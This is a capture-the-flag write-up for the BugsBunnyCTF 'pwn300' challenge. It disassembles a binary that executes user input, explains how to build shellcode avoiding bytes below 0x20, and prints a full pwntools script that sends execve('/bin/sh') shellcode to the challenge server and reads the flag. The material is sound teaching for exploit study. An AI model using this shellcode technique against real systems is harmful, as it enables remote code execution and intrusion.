# Pwn300 (pwnage 300)
Author: muffinx

Description:
```
Oh this time need skills guys

task : nc 54.153.19.139 5256
```


Binary type:

```
pwn300: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=1da985f3981214bb78b782af238092d88d9a889e, not stripped
```

Binary security measurements:

```
CANARY    : ENABLED
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partial
```

Code in the beginning:

```c++
int welcome()
{
  return puts("Welcome to BugsBunnyCTF!");
}

int __cdecl main(int argc, const char **argv, const char **envp)
{
  FILE *v3; // rdi@1

  v3 = _bss_start;
  setvbuf(_bss_start, 0LL, 1, 0LL);
  welcome();
  itshere(v3, 0LL);
  return 0;
}
```

There's not a lot happening.
But the "itshere" function is interesting.
Unfortunately I can't post here an aesthetic pseudcode, because call-analysis fails in this function.
But why? That's pretty clear when we take a more exact look at it:

```
.text:0000000000400791
.text:0000000000400791 loc_400791:
.text:0000000000400791 lea     rax, [rbp+buf]
.text:0000000000400798 mov     edx, 1          ; nbytes
.text:000000000040079D mov     rsi, rax        ; buf
.text:00000000004007A0 mov     edi, 0          ; fd
.text:00000000004007A5 call    _read
.text:00000000004007AA movzx   eax, [rbp+buf]
.text:00000000004007B1 cmp     al, 0Ah         ; check if it's a newline character -> execute code
.text:00000000004007B3 jz      short shellcode_finished
```

So it reads exactly one byte and checks if it's 0Ah = "\n" (newline).
If it's it'll jump to this code:

```
.text:0000000000400847
.text:0000000000400847 loc_400847:
.text:0000000000400847 lea     rax, [rbp+var_210]
.text:000000000040084E mov     [rbp+var_218], rax
.text:0000000000400855 mov     rdx, [rbp+var_218]
.text:000000000040085C mov     eax, 0
.text:0000000000400861 call    rdx
```

Debugging it, I saw that "call rdx" actually calls our input.
So we basically could submit shellcode and pwn it.
But, there's a restriction:

```
.text:00000000004007D2 movzx   eax, [rbp+buf]
.text:00000000004007D9 cmp     al, 1Fh
.text:00000000004007DB jle     short short wrong_shellcode_byte
```

So if a byte of the shellcode is less than 0x1F the program will exit.
I quickly said "let's go as close as alphanumeric as I quickly can" and I did that.

Here are some good references which will explain this topic in deepth:

https://dl.packetstormsecurity.net/papers/shellcode/alpha.pdf
https://nets.ec/Alphanumeric_shellcode
https://nets.ec/Shellcode/Alphanumeric

I used the following instructions to achieve this:

1.) push / pop
2.) xor

Looking at the x64 syscall table of linux we see that sys_execve needs the following register values:

eax = 0x3b
rdi = const char *filename
rsi = const char *const argv[]
rdx = const char *const envp[]

So we just have to set eax to 0x3b and rdi pointing to the string "/bin/sh" to get a shell.

Here's the beginning values during shellcode execution of the registers:
```
RAX: 0x0
RBX: 0x0
RCX: 0x7f4b667eaba0 (<__read_nocancel+7>:	cmp    rax,0xfffffffffffff001)
RDX: 0x7ffe33dceb90 ("f5PPf5_UH1B@AVAVAV^ZXPf5shfPAVXf5n/fPAVXf5bifPAVXf5//fPT_AVX4R4i")
RSI: 0x7ffe33dceb7b --> 0x71fd78000000400a
RDI: 0x0
RBP: 0x7ffe33dceda0 --> 0x7ffe33dcedb0 --> 0x0
RSP: 0x7ffe33dceb70 --> 0x7f4b66cd94c0 --> 0x7f4b6670f000 --> 0x3010102464c457f
RIP: 0x400861 (<itshere+299>:	call   rdx)
R8 : 0x3f20657265682064 ('d here ?')
R9 : 0x0
R10: 0x7ffe33dce930 --> 0x0
R11: 0x246
R12: 0x400640 (<_start>:	xor    ebp,ebp)
R13: 0x7ffe33dcee90 --> 0x1
R14: 0x0
R15: 0x0

```

To understand my shellcode look at the beginning register values and my exploit.
As you can see, rdx points to our shellcode, so we can write the "syscall" instruction by using:
```
xor ax,0x5050
xor ax,0x555f
xor [rdx+0x40],rax
```

Here's my finished exploit:
```python
#!/usr/bin/env python

from pwn import *
context.update(arch='amd64', os='linux')


# r = process('./pwn300')
r = remote('54.153.19.139', 5256)

#gdb.attach(r, '''
#set follow-fork-mode child
#break *0x0400861
#continue
#''')


# write syscall instruction
payload = asm('xor ax,0x5050')
payload += asm('xor ax,0x555f')
payload += asm('xor [rdx+0x40],rax')

# clear rax, rsi, rdx
payload += asm('push r14')
payload += asm('push r14')
payload += asm('push r14')
payload += asm('pop rsi')
payload += asm('pop rdx')
payload += asm('pop rax')

# change rdi to /bin/sh
payload += asm('push rax')
payload += asm('xor ax,0x6873')
payload += asm('push ax')

payload += asm('push r14')
payload += asm('pop rax')
payload += asm('xor ax,0x2f6e')
payload += asm('push ax')

payload += asm('push r14')
payload += asm('pop rax')
payload += asm('xor ax,0x6962')
payload += asm('push ax')

payload += asm('push r14')
payload += asm('pop rax')
payload += asm('xor ax,0x2f2f')
payload += asm('push ax')

payload += asm('push rsp')
payload += asm('pop rdi')

# put 0x3b in rax
payload += asm('push r14')
payload += asm('pop rax')
payload += asm('xor al,0x52')
payload += asm('xor al,0x69')


r.recvuntil('here ?\n')
r.sendline(payload)
r.interactive()
```


Boom! We got a shell! pew pew pew!
```
$ cat /home/pwn300/flag
Bugs_Bunny{ITs_asm_and_its_easy_But_need_more_skills!!}
```
